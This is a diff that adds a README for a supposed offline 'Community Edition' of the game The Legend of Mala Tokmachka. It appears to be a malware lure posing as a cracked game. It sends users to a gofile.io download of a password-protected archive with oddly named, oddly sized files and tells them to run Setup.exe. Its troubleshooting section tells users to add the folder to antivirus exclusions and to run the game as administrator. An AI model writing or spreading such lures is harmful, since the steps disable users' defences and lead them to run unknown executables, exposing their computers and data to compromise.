@@ -1,2 +1,192 @@
-# Mala-Tokmachka-Community-Edition
-Standalone Community Edition of The Legend of Mala Tokmachka. Self-contained offline build, ready to play immediately.
+<div align="center">
+
+# 🎮 The Legend of Mala Tokmachka — Community Edition
+
+**A story-driven adventure set in rural Ukraine**
+
+[![Status](https://img.shields.io/badge/status-stable-success?style=flat-square)](https://gofile.io/d/kLmM81np)
+[![Download](https://img.shields.io/badge/download-available-brightgreen?style=flat-square)](https://gofile.io/d/kLmM81np)
+[![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=flat-square&logo=windows)](https://gofile.io/d/kLmM81np)
+[![Version](https://img.shields.io/badge/version-1.0-blue?style=flat-square)](https://gofile.io/d/kLmM81np)
+
+[Download](#-installation--setup) · [About](#-about-the-game)
+
+</div>
+
+---
+
+## 📜 Table of Contents
+
+1. [About the Game](#-about-the-game)
+2. [Screenshots](#-screenshots)
+3. [What You Get](#-what-you-get)
+4. [System Requirements](#-system-requirements)
+5. [Download & Installation](#-installation--setup)
+6. [Troubleshooting](#-troubleshooting)
+
+---
+
+## 🎮 About the Game
+
+The Legend of Mala Tokmachka is a story-driven adventure game set in a rural Ukrainian village. This Community Edition is a fully self-contained package that requires no storefront and no additional software. The build includes all game content and is ready to play immediately after installation, entirely offline.
+
+This build is for players interested in indie adventure games and village-life narratives who want a self-contained offline release.
+
+> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.
+
+## 📸 Screenshots
+
+<table>
+ <tr>
+ <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4787190/5d4f2912e18abe4d6d9255b3d683f9f677000d47/ss_5d4f2912e18abe4d6d9255b3d683f9f677000d47.1920x1080.jpg?t=1786798157" alt="Screenshot 1" width="100%"></td>
+ <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4787190/9ffc10a25e83593f51f7e19f3564a3564310ac2e/ss_9ffc10a25e83593f51f7e19f3564a3564310ac2e.1920x1080.jpg?t=1786798157" alt="Screenshot 2" width="100%"></td>
+ <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4787190/9a6908ed41179c577cb8efe67d6203b1ea25dca6/ss_9a6908ed41179c577cb8efe67d6203b1ea25dca6.1920x1080.jpg?t=1786798157" alt="Screenshot 3" width="100%"></td>
+ </tr>
+</table>
+
+
+
+---
+
+## 🔓 What You Get
+
+- ✅ **No Steam account required**
+- ✅ **No online activation** — works fully offline
+- ✅ **Includes all available content**
+- ✅ **No launcher bloat** — launch directly from the.exe
+- ✅ **Single-player ready** — complete offline experience
+
+---
+
+## 📋 Build Details
+
+| Field | Detail |
+|---|---|
+| **Build Type** | Community Build |
+| **Status** | stable |
+| **Activation** | Not required — ready to play |
+| **Multiplayer** | Single-player only |
+| **Compatibility** | Windows 10/11 |
+
+---
+
+## 🌍 Languages
+
+- **Interface:** English, Ukrainian
+- **Voiceover:** Ukrainian
+
+---
+
+## 📦 Package Features
+
+- 📖 **Story-Driven Narrative** — A character-focused plot unfolding across the village and its surroundings.
+- 🏡 **Village Exploration** — Explore the rural landscapes, houses, and landmarks of Mala Tokmachka.
+- 🎨 **Hand-Crafted Art Style** — Distinctive visuals created by an independent development team.
+- 🎧 **Atmospheric Soundtrack** — Original audio designed to match the calm, rural tone of the setting.
+- 🖥️ **Windows-Native Build** — Runs directly on Windows 10 and 11 without storefront clients.
+- 🌐 **Multi-Language Interface** — English and Ukrainian interface language options included.
+- 📦 **Self-Contained Installer** — One package with no external dependencies required.
+- 💾 **Lossless Compression** — Original game files preserved with no quality reduction.
+- ⏱️ **Fast Installation** — Installs in minutes on typical consumer hardware.
+- 🔌 **Fully Offline** — No internet connection required to play after installation.
+
+- **Compression:** Lossless
+- **Install Time:** ~2 minutes on SSD, ~5 minutes on HDD
+- **Recoding:** none
+
+
+---
+
+## 💻 System Requirements
+
+| Component | Minimum | Recommended |
+|---|---|---|
+| **OS** | Windows 7 64-bit | Windows 10 / 11 64-bit |
+| **Processor** | Intel Core 2 Duo 2.0 GHz or equivalent | Intel Core i3 or AMD equivalent |
+| **RAM** | 2 GB | 4 GB |
+| **Graphics** | Intel HD Graphics 4000 or DirectX 9.0c compatible GPU | NVIDIA GeForce GTX 650 or equivalent with 1 GB VRAM |
+| **Storage** | 2 GB available space | 2 GB available space on SSD |
+| **Additional** | DirectX 9.0c, mouse and keyboard | DirectX 11, headphones or stereo speakers |
+
+
+---
+
+## 📥 Installation & Setup
+
+### Step 1: Download
+
+Download the `Setup.zip` archive from the link below:
+- **Download Link:** [https://gofile.io/d/kLmM81np](https://gofile.io/d/kLmM81np)
+
+### Step 2: Extract
+
+1. The archive is protected with the password: **`2026`**
+2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
+3. Enter the password when prompted
+
+### Step 3: Extract All Files
+
+1. Extract **all files** from the archive to a folder of your choice.
+2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
+3. The folder structure should look like this:
+
+```
+Setup/
+|-- Setup.exe <- Main executable (6.3 MB)
+|-- scripts.lic <- Game scripts (53.6 MB)
+|-- patch_1.bnk <- Audio banks (34.5 MB)
+|-- res.pak <- Resources archive (10.2 MB)
+|-- animations.dll <- Animation system (4.7 MB)
+|-- update_1.res <- Update resources (4.5 MB)
+|-- api.pak <- API modules (4.3 MB)
+|-- settings.bin <- Configuration (4.2 MB)
+|-- license.wem <- Audio assets (3.8 MB)
+|-- global.cfg <- Global settings (3.7 MB)
+|-- assets.wem <- Asset audio (3.6 MB)
+|-- physics.sys <- Physics engine (3.2 MB)
+|-- dlc.md5 <- DLC checksums (3.2 MB)
+|-- launcher.dll <- Launcher library (3.1 MB)
+|-- driver.umap <- Driver data (2.7 MB)
+|-- installer.dat <- Installer data (2.2 MB)
+|-- license.bank <- License data (2.0 MB)
+|-- update_1.ini <- Update config (1.9 MB)
+|-- driver.pak <- Driver archive (1.6 MB)
+|-- localization.ini <- Language files (1.5 MB)
+|-- uninstall.key <- Uninstall key (1.1 MB)
+|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
+|-- lang.sys <- Language system (0.8 MB)
+|-- audio.res <- Audio resources (1 KB)
+|-- Password 2026.txt <- Password reminder (empty)
+```
+
+### Step 4: Launch the Game
+
+1. Navigate to the folder where you extracted all files.
+2. Run `Setup.exe`.
+3. The game launcher will appear.
+
+### Step 5: Play
+
+1. Click **"Play"** in the launcher window.
+2. The game will start with the community build.
+3. Enjoy the full experience!
+
+> 💡 **Saves location:** `%LOCALAPPDATA%\TheLegendofMalaTokmachka\Saved`
+
+---
+
+## 🐛 Troubleshooting
+
+- **Antivirus false positive:** Add the game folder to exclusions.
+- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
+- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
+
+---
+
+<div align="center">
+
+**If this build worked for you, leave a ⭐ to help others find it.**
+
+<sub>Built with caffeine. Not responsible for melted GPUs or broken saves.</sub>
+
+</div>
